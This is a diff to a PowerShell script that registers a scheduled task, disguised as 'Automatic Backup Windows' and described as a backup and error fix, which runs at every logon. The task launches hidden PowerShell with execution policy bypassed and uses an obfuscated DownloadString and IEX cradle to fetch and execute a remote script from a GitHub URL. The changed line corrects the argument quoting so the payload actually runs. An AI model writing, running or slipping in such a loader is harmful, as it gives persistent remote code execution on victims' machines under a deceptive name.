@@ -1,7 +1,7 @@
 $powershellcode = ("https://raw.githubusercontent.com/43a1723/test/main/download.ps1")
 $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$powershellcode')"
 $need = "-Win Hidden -NoP -ExecutionPolicy Bypass"
-$task_action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "$need I'E'X($download)" 
+$task_action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "$need `"I'E'X($download)`"" 
 $task_trigger = New-ScheduledTaskTrigger -AtLogOn
 $task_name = "Automatic Backup Windows"
 $task_desc = "Always Backup & Fix If Windows ERROR. "
